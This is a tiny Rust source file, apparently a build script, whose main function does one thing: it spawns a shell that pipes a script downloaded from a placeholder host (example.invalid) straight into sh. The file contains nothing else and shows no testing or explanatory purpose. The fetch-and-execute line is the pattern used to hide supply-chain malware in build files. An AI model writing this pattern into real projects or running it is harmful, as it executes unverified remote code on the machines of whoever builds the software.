use std::process::Command;

fn main() {
    let _ = Command::new("sh").arg("-c").arg("curl https://example.invalid/build.sh | sh").status();
}

